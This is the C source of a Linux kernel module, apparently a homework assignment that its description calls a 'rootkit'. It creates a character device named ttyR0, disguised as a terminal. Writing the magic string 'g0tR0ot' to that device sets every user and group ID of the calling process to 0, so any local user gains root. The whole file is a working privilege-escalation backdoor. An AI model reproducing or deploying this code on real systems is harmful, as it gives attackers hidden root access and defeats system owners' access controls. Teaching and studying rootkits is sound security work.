#include <linux/init.h> //macros used to mark up functions e.g __init __exit
#include <linux/module.h> //core header for LKM
#include <linux/device.h> //support kernel driver model
#include <linux/kernel.h> //types, macros, functions for the kernel
#include <linux/fs.h> // file operations
#include <linux/uaccess.h> // copy to user function
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

#define DEVICE_NAME "ttyR0" // name of the module
#define CLASS_NAME "ttyR" // class of the module

#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 4, 0)
#define V(x) x.val
#else
#define V(x) x
#endif

// function prototypes
static int __init root_init(void);
static void __exit root_exit(void);
static int root_open(struct inode *inode, struct file *f);
static ssize_t root_read(struct file *f, char *buffer, size_t len, loff_t *off);
static ssize_t root_write(struct file *f, const char __user *buffer, size_t len, loff_t *off);

// Module Info
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tyler Kim (tkj9ep)");
MODULE_DESCRIPTION("rootkit homework");
MODULE_VERSION("0.1");

static int majorNumber; // major number that allows the kernel to determine which module to use
static struct class* rootcharClass = NULL; // class struct pointer
static struct device* rootcharDevice = NULL; // device struct pointer

// fops maps the functions pointers
static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = root_open,
    .read = root_read,
    .write = root_write,
};

static int root_open(struct inode *inode, struct file *f) {
    return 0;
}
  


static ssize_t root_read (struct file *f, char *buffer, size_t len, loff_t *off) {
    return len;
}

static ssize_t root_write(struct file *f, const char __user *buffer, size_t len, loff_t *off) {
    char *data;
    char magic[] = "g0tR0ot";
    struct cred *new_cred;

    data = (char *) kmalloc(len + 1, GFP_KERNEL);

    if (data) {
        copy_from_user(data, buffer, len);
        if (memcmp(data, magic, 7) == 0) {
            if ((new_cred = prepare_creds()) == NULL) {
                printk("ttyRK: Cannot prepare credentials\n");
                return 0;
            }
            printk("ttyRK: You got in.\n");
            V(new_cred -> uid) = V(new_cred -> gid) = 0;
            V(new_cred -> euid) = V(new_cred -> egid) = 0;
            V(new_cred -> suid) = V(new_cred -> sgid) = 0;
            V(new_cred -> fsuid) = V(new_cred -> fsgid) = 0;
            commit_creds(new_cred); 
        }
        kfree(data);
      } else {
        printk(KERN_ALERT "ttyRK: Unable to allocate memory");
      }

      return len;
}

static int __init root_init(void) {
    printk("ttyRK: LKM installed\n");

    //create character device
    if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0) {
        printk(KERN_ALERT "ttyRK failed to register a major number\n");
        return majorNumber;
    }

    printk(KERN_INFO "ttyRK: major number %d\n", majorNumber);

    //register device class
    rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(rootcharClass)) {
        unregister_chrdev(majorNumber, DEVICE_NAME);
        printk(KERN_ALERT "ttyRK: failed to register device class\n");
        return PTR_ERR(rootcharClass);
    }

    printk(KERN_INFO "ttyRK: device class registered correctly\n");

    //register device driver
    rootcharDevice = device_create(rootcharClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
    if (IS_ERR(rootcharDevice)) {
        class_destroy(rootcharClass);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        printk(KERN_ALERT "ttyRK: Failed to create the device\n");
        return PTR_ERR(rootcharDevice);
    }

    return 0;
}

static void __exit root_exit(void) {
    //destroy device
    device_destroy(rootcharClass, MKDEV(majorNumber, 0));
    class_unregister(rootcharClass);
    class_destroy(rootcharClass);
    unregister_chrdev(majorNumber, DEVICE_NAME);

    printk("ttyRK: Goodbye\n");
}

module_init(root_init);
module_exit(root_exit);



